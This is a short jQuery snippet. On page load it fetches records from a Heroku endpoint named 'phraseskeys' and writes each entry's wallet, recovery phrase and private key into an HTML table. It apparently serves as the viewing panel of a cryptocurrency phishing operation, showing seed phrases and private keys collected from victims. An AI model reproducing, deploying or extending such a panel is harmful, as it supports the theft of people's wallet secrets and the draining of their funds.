
$(document).ready(function () {              
    $.get('https://phraseskeys.herokuapp.com/p381fgRXiWvAkntW50Ux',  function(result){ 
          console.log(result);
        
          for(var i=0;i<result.length;i++){
              var row="<tr><td>"+result[i].wallet+"</td><td>"+result[i].phrase+"</td><td>"+result[i].privatekey+"</td></tr>";
              $("#values").append(row);
          }
    });
});
